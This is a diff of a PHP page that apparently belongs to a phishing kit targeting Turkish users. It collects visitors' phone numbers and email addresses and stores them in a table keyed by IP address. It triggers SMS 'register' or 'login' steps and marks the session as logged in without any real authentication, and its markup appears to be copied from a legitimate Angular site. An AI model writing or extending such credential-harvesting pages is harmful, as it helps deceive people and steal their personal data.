@@ -1,25 +1,47 @@
 <?php
-if (!($_SERVER['REQUEST_METHOD'] === 'POST')) {
+if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header("Location: /", true, 302);
    exit;
 }
-$userIp = $_SERVER['REMOTE_ADDR'];  // Güncellenmesini istediğiniz kullanıcının ID'si
-$newEmail = 'a';  // Yeni e-posta adresi
-$sql = "UPDATE `users` SET `eposta` = :newEmail WHERE `users`.`ip` = :userIp";
-$stmt = $pdo->prepare($sql);
-$stmt->bindParam(':newEmail', $newEmail, PDO::PARAM_STR);
-$stmt->bindParam(':userId', $userId, PDO::PARAM_STR);
-$stmt->execute();
 
+if (!isset($_POST["telefon"]) || empty($_POST["telefon"])) {
+   header("Location: /", true, 302);
+   exit;
+}
 
+$_POST["telefon"] = str_replace("+90", "", $_POST["telefon"]);
+$userIp = $_SERVER['REMOTE_ADDR'];
+
+if (isset($_POST["email"]) && !empty($_POST["email"])) {
+   register_sms($_POST["email"], $_POST["telefon"]);
+   $sql = "UPDATE `users` SET `eposta` = :newEmail, `phone` = :newTelefon WHERE `users`.`ip` = :userIp";
+   $stmt = $pdo->prepare($sql);
+   $stmt->bindParam(':newEmail', $_POST["email"], PDO::PARAM_STR);
+   $stmt->bindParam(':newTelefon', $_POST["telefon"], PDO::PARAM_STR);
+   $stmt->bindParam(':userIp', $userIp, PDO::PARAM_STR);
+   $stmt->execute();
+} else {
+   login_sms($_POST["telefon"]);
+   $sql = "UPDATE `users` SET `phone` = :newTelefon WHERE `users`.`ip` = :userIp";
+   $stmt = $pdo->prepare($sql);
+   $stmt->bindParam(':newTelefon', $_POST["telefon"], PDO::PARAM_STR);
+   $stmt->bindParam(':userIp', $userIp, PDO::PARAM_STR);
+   $stmt->execute();
+}
+
+$_SESSION['login'] = 1;
 ?>
 <style>
     .header{
         display: none;
     }
-    .footer{
-        display: none;
+    <?php
+      if ($detect->isMobile()) {?>
+    .footer
+    {
+      display: none;
     }
+    <?php }?>
 </style>
       <sm-header-lite _ngcontent-tus-c368="" _nghost-tus-c366="" class="ng-star-inserted">
          <div _ngcontent-tus-c366="" class="header-wrapper">
